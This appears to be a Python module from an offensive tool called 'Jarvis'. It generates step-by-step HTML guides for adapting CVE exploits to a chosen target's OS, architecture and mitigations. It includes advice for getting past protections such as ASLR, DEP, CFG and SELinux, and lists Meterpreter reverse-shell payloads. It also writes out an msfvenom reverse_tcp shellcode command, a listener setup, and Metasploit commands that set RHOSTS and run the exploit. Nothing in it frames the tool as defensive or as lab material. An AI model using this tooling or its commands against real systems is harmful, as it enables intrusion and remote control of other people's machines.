"""Adaptation guide generator for Jarvis.

Generates step-by-step instructions for adapting exploits to specific targets,
including what needs to change, which Metasploit modules to use, and how to
modify shellcode/payloads.
"""
import os
import sys
from typing import Dict, List, Optional, Any

sys.path.insert(0, os.path.dirname(__file__))
from schema import VulnerabilityEntry
from ranker import ExploitRanker
from profiler import get_mitigations_for_profile


# Mitigation-specific adaptation notes
MITIGATION_GUIDES = {
    "aslr": {
        "enabled": "ASLR is enabled. You need an info leak to determine base addresses. "
                   "Consider using a format string vulnerability or partial overwrite technique.",
        "disabled": "ASLR is disabled. Addresses are predictable. "
                    "Use hardcoded offsets from the target binary.",
    },
    "dep": {
        "enabled": "DEP/NX is enabled. You cannot execute shellcode on the stack. "
                   "Use ROP chains or return-to-libc techniques.",
        "disabled": "DEP/NX is disabled. You can execute shellcode directly on the stack.",
    },
    "pie": {
        "enabled": "PIE is enabled. Binary is loaded at random base. "
                   "Need info leak or relative addressing.",
        "disabled": "PIE is disabled. Binary loads at fixed address. "
                    "Use absolute addresses from the binary.",
    },
    "pac": {
        "enabled": "PAC (Pointer Authentication) is enabled. "
                   "You need a PAC bypass gadget or kernel PAC oracle.",
        "disabled": "PAC is disabled. Standard ROP/JOP techniques work.",
    },
    "cfg": {
        "enabled": "CFG (Control Flow Guard) is enabled. "
                   "Indirect calls are validated. Need CFG bypass or use permitted targets.",
        "disabled": "CFG is disabled. Standard ROP/JOP techniques work.",
    },
    "cet": {
        "enabled": "CET (Control-flow Enforcement) is enabled. "
                   "Shadow stack protects return addresses. Need CET bypass or different technique.",
        "disabled": "CET is disabled. Standard ROP techniques work.",
    },
    "selinux": {
        "enabled": "SELinux is enforcing. Even after root, operations are restricted. "
                   "Need SELinux context transition or permissive mode exploit.",
        "disabled": "SELinux is permissive or disabled. Full root access after exploit.",
    },
    "stack_canary": {
        "enabled": "Stack canaries are enabled. Buffer overflows will be detected. "
                   "Need canary leak or overwrite technique.",
        "disabled": "Stack canaries are disabled. Direct buffer overflows work.",
    },
}

# Platform-specific payload recommendations
PAYLOAD_RECOMMENDATIONS = {
    "android": {
        "remote": [
            "android/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_http",
            "android/shell/reverse_tcp",
        ],
        "local": [
            "android/shell/reverse_tcp",
            "android/meterpreter/reverse_tcp",
        ],
    },
    "linux": {
        "remote": [
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "linux/armle/meterpreter/reverse_tcp",
            "linux/aarch64/meterpreter/reverse_tcp",
        ],
        "local": [
            "linux/x64/exec",
            "linux/x86/exec",
            "linux/x64/shell_reverse_tcp",
        ],
    },
    "windows": {
        "remote": [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_http",
            "windows/x86/meterpreter/reverse_tcp",
        ],
        "local": [
            "windows/x64/exec",
            "windows/x86/exec",
            "windows/x64/shell_reverse_tcp",
        ],
    },
}

# Arch-specific shellcode considerations
ARCH_SHELLCODE_NOTES = {
    "arm64": [
        "Use position-independent shellcode (no absolute addresses)",
        "Avoid null bytes (\\x00) in shellcode",
        "ARM64 uses A64 instruction set, not Thumb mode",
        "Consider using `pwntools` shellcraft for ARM64",
    ],
    "arm": [
        "ARMv7 supports both ARM and Thumb modes",
        "Thumb mode shellcode is shorter and avoids more bad chars",
        "Use `shellcraft.arm.linux.sh()` for simple shell spawn",
    ],
    "x86_64": [
        "64-bit pointers, use `p64()` for addresses",
        "System V AMD64 ABI: first 6 args in RDI, RSI, RDX, RCX, R8, R9",
        "Use `ROPgadget` or `ropper` to find gadgets",
    ],
    "x86": [
        "32-bit pointers, use `p32()` for addresses",
        "cdecl calling convention: args on stack",
        "Smaller shellcode, more gadgets available",
    ],
}


class AdaptationGuide:
    """Generate step-by-step adaptation instructions for an exploit."""

    def __init__(self, entry: VulnerabilityEntry, profile: Dict[str, Any]):
        self.entry = entry
        self.profile = profile
        self.vtype = entry.vulnerability_type.lower()
        self.platform = profile.get("os", "").lower()
        self.arch = profile.get("arch", "").lower()
        self.mitigations = profile.get("mitigations", {})
        self.access = profile.get("access", "unknown")
        self.goal = profile.get("goal", "remote code execution")

    def generate(self) -> str:
        """Generate the complete adaptation guide."""
        sections = []

        sections.append(self._header())
        sections.append(self._vulnerability_summary())
        sections.append(self._trigger_analysis())
        sections.append(self._mitigation_analysis())
        sections.append(self._architecture_notes())
        sections.append(self._payload_recommendations())
        sections.append(self._adaptation_steps())
        sections.append(self._metasploit_guide())
        sections.append(self._testing_guide())

        body = "\n".join(s for s in sections if s)
        tts_text = f"Adaptation guide for {self.entry.cve_id}. Target: {self.profile.get('os', '?')} {self.profile.get('version', '?')}. Goal: {self.goal}."
        return f'<!--EXPLOIT_START--><!--TTS:{tts_text}-->' + body + '<!--EXPLOIT_END-->'

    def _header(self) -> str:
        return (
            f'<div class="guide-header">'
            f'<h1>Adaptation Guide: {self.entry.cve_id}</h1>'
            f'<div class="guide-target">Target: <strong>{self.profile.get("os", "?")} {self.profile.get("version", "?")}</strong> ({self.profile.get("arch", "?")})</div>'
            f'<div class="guide-goal">Goal: {self.goal}</div>'
            f'</div>'
        )

    def _vulnerability_summary(self) -> str:
        tp = self.entry.trigger_primitives
        h = ['<div class="guide-section"><h2>Vulnerability Summary</h2>']
        h.append(f'<div class="exploit-meta"><span class="exploit-type">{self.entry.vulnerability_type}</span><span class="exploit-target">{self.entry.target}</span></div>')
        h.append(f'<p>{self.entry.description[:300]}</p>')

        if tp.overflow_value:
            h.append(f'<div class="vuln-detail"><span class="vuln-label">Trigger value:</span><code>{tp.overflow_value}</code></div>')
        if tp.entry_count:
            h.append(f'<div class="vuln-detail"><span class="vuln-label">Entry count:</span><code>{tp.entry_count}</code></div>')
        if tp.entry_size:
            h.append(f'<div class="vuln-detail"><span class="vuln-label">Entry size:</span><code>{tp.entry_size}</code></div>')
        if tp.offset:
            h.append(f'<div class="vuln-detail"><span class="vuln-label">Offset:</span><code>{tp.offset}</code></div>')

        fs = self.entry.target_file_structure
        if fs:
            h.append(f'<div class="vuln-detail"><span class="vuln-label">File format:</span>{fs.format}</div>')
            h.append(f'<div class="vuln-detail"><span class="vuln-label">Vulnerable atom:</span>{fs.vulnerable_atom}</div>')

        h.append('</div>')
        return "\n".join(h)

    def _trigger_analysis(self) -> str:
        vtype = self.vtype
        h = ['<div class="guide-section"><h2>Trigger Analysis</h2>']

        if vtype == "integer_overflow":
            ec = self.entry.trigger_primitives.entry_count or "0x40000000"
            es = self.entry.trigger_primitives.entry_size or 12
            try:
                ec_int = int(ec, 0)
                overflow = ec_int * es
                wrapped = overflow & 0xFFFFFFFF
                h.append(f'<p>The integer overflow occurs when <code>{ec} * {es} = 0x{overflow:X}</code>.</p>')
                h.append(f'<p>This wraps to <code>0x{wrapped:08X}</code> in 32-bit arithmetic.</p>')
                h.append(f'<p>Result: {self.entry.trigger_primitives.overflow_field or "size"} calculation is wrong, leading to undersized allocation and heap corruption.</p>')
            except ValueError:
                h.append(f'<p>Trigger: {ec} * {es} causes integer overflow.</p>')

        elif vtype == "buffer_overflow":
            offset = self.entry.trigger_primitives.offset or "0x100"
            h.append(f'<p>Buffer overflow at offset <code>{offset}</code>.</p>')
            h.append('<p>Overwrite saved RBP and return address to control execution flow.</p>')
            h.append('<p>Need to bypass stack canary if enabled.</p>')

        elif vtype == "use_after_free":
            h.append('<p>Use-after-free: object is freed then accessed again.</p>')
            h.append('<p>Spray heap with controlled data to reclaim freed memory.</p>')
            h.append('<p>Vtable or function pointer overwrite leads to code execution.</p>')

        elif vtype == "remote_code_execution":
            h.append('<p>Remote code execution via memory corruption or logic flaw.</p>')
            h.append('<p>Chain: trigger → corruption → code execution → payload.</p>')

        else:
            h.append(f'<p>Vulnerability type: {vtype}</p>')
            h.append('<p>Analyze the specific trigger mechanism for your target.</p>')

        h.append('</div>')
        return "\n".join(h)

    def _mitigation_analysis(self) -> str:
        h = ['<div class="guide-section"><h2>Mitigation Analysis</h2>']
        h.append(f'<p>Target mitigations for <strong>{self.profile.get("os", "?")}</strong>:</p>')

        for mit, enabled in sorted(self.mitigations.items()):
            status = "ENABLED" if enabled else "disabled"
            status_cls = "mit-on" if enabled else "mit-off"
            icon = "🔴" if enabled else "🟢"
            guide = MITIGATION_GUIDES.get(mit, {})
            note = guide.get("enabled" if enabled else "disabled", "")
            h.append(f'<div class="mit-row"><span class="mit-icon">{icon}</span><span class="mit-name">{mit.upper()}</span><span class="mit-status {status_cls}">{status}</span></div>')
            if note:
                h.append(f'<div class="mit-note">{note}</div>')

        enabled_count = sum(1 for v in self.mitigations.values() if v)
        total_count = len(self.mitigations)
        h.append(f'<div class="mit-summary"><strong>{enabled_count}/{total_count}</strong> mitigations enabled</div>')
        if enabled_count > 4:
            h.append('<div class="mit-verdict hard">High mitigation environment — exploit complexity will be significant</div>')
        elif enabled_count > 2:
            h.append('<div class="mit-verdict moderate">Moderate mitigation environment — standard bypass techniques apply</div>')
        else:
            h.append('<div class="mit-verdict easy">Low mitigation environment — straightforward exploitation</div>')
        h.append('</div>')
        return "\n".join(h)

    def _architecture_notes(self) -> str:
        arch = self.arch
        notes = ARCH_SHELLCODE_NOTES.get(arch, [])

        if not notes:
            return ""

        h = [f'<div class="guide-section"><h2>Architecture Notes ({arch})</h2>']
        h.append('<ul>')
        for note in notes:
            h.append(f'<li>{note}</li>')
        h.append('</ul></div>')

        return "\n".join(h)

    def _payload_recommendations(self) -> str:
        platform_payloads = PAYLOAD_RECOMMENDATIONS.get(self.platform, {})
        access_type = "local" if "local" in self.access else "remote"
        payloads = platform_payloads.get(access_type, platform_payloads.get("remote", []))

        if not payloads:
            return ""

        h = [f'<div class="guide-section"><h2>Recommended Payloads</h2>']
        h.append(f'<p>For {access_type} {self.platform}:</p>')
        h.append('<ul>')
        for p in payloads:
            h.append(f'<li><code>{p}</code></li>')
        h.append('</ul></div>')

        return "\n".join(h)

    def _adaptation_steps(self) -> str:
        h = ['<div class="guide-section"><h2>Adaptation Steps</h2>']
        step = 1

        msf = self.entry.trigger_primitives.custom.get("metasploit_module", "")
        if msf:
            h.append(f'<div class="step-card"><div class="step-num">{step}</div><div class="step-content"><h3>Get the Metasploit module</h3>')
            h.append(f'<pre><code>msfconsole\nuse {msf}\nshow options</code></pre></div></div>')
            step += 1

        h.append(f'<div class="step-card"><div class="step-num">{step}</div><div class="step-content"><h3>Configure for your target</h3>')
        h.append(f'<p>Set the target OS, version, and architecture in the module options.</p>')
        if self.platform == "android":
            h.append('<p>For Android: ensure ADB is connected or use browser exploit delivery.</p>')
        elif self.platform == "linux":
            h.append('<p>For Linux: determine the exact kernel and glibc version.</p>')
        elif self.platform == "windows":
            h.append('<p>For Windows: determine the exact build number and patch level.</p>')
        h.append('</div></div>')
        step += 1

        enabled_mits = [k for k, v in self.mitigations.items() if v]
        if enabled_mits:
            h.append(f'<div class="step-card"><div class="step-num">{step}</div><div class="step-content"><h3>Bypass mitigations</h3><ul>')
            for mit in enabled_mits:
                guide = MITIGATION_GUIDES.get(mit, {})
                note = guide.get("enabled", f"Bypass {mit}")
                h.append(f'<li>{note}</li>')
            h.append('</ul></div></div>')
            step += 1

        h.append(f'<div class="step-card"><div class="step-num">{step}</div><div class="step-content"><h3>Adjust shellcode/payload</h3>')
        h.append(f'<p>Use the recommended payload from Metasploit, or generate custom shellcode:</p>')
        h.append(f'<pre><code># Generate shellcode for {self.arch}\nmsfvenom -p linux/{self.arch}/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f c</code></pre></div></div>')
        step += 1

        h.append(f'<div class="step-card"><div class="step-num">{step}</div><div class="step-content"><h3>Test the exploit</h3>')
        h.append('<ol><li>Set up a listener: <code>msfconsole -x "use exploit/multi/handler; set PAYLOAD ...; run"</code></li>')
        h.append('<li>Run the exploit against your target</li>')
        h.append('<li>If it fails, check the adaptation notes above and adjust.</li></ol></div></div>')

        h.append('</div>')
        return "\n".join(h)

    def _metasploit_guide(self) -> str:
        msf = self.entry.trigger_primitives.custom.get("metasploit_module", "")
        if not msf:
            return ""

        h = ['<div class="guide-section"><h2>Metasploit Module</h2>']
        h.append(f'<div class="exploit-msf"><span class="msf-label">Module</span><code>{msf}</code></div>')
        h.append('<pre><code>msfconsole')
        h.append(f'use {msf}')
        h.append('info          # Show module details')
        h.append('show options  # Show configurable options')
        h.append('show targets  # Show supported targets')
        h.append('set RHOSTS target_ip')
        h.append('set LHOST your_ip')
        h.append('exploit       # Run the exploit')
        h.append('</code></pre></div>')

        return "\n".join(h)

    def _testing_guide(self) -> str:
        h = ['<div class="guide-section"><h2>Testing Checklist</h2>']
        h.append('<div class="step-card"><div class="step-content"><ul>')
        h.append('<li>Verified target OS and version</li>')
        h.append('<li>Confirmed vulnerability exists (check patch level)</li>')
        h.append('<li>Set up listener (metasploit handler)</li>')
        h.append('<li>Tested exploit against target</li>')
        h.append('<li>Verified payload execution</li>')
        h.append('<li>If SELinux/AV enabled, verified context transition</li>')
        h.append('<li>Cleaned up test artifacts</li>')
        h.append('</ul></div></div></div>')

        return "\n".join(h)


def generate_guide(entry: VulnerabilityEntry, profile: Dict[str, Any]) -> str:
    """High-level function to generate an adaptation guide."""
    guide = AdaptationGuide(entry, profile)
    return guide.generate()


if __name__ == "__main__":
    from schema import lookup_cve
    from profiler import PRESET_PROFILES

    if len(sys.argv) < 2:
        print("Usage: python guide.py <CVE-ID> [preset_profile]")
        print("Example: python guide.py CVE-2015-3864 android_modern")
        sys.exit(1)

    cve_id = sys.argv[1]
    preset = sys.argv[2] if len(sys.argv) > 2 else "android_modern"

    entry = lookup_cve(cve_id)
    if not entry:
        print(f"CVE {cve_id} not found in database")
        sys.exit(1)

    profile = PRESET_PROFILES.get(preset, PRESET_PROFILES["android_modern"])
    print(generate_guide(entry, profile))
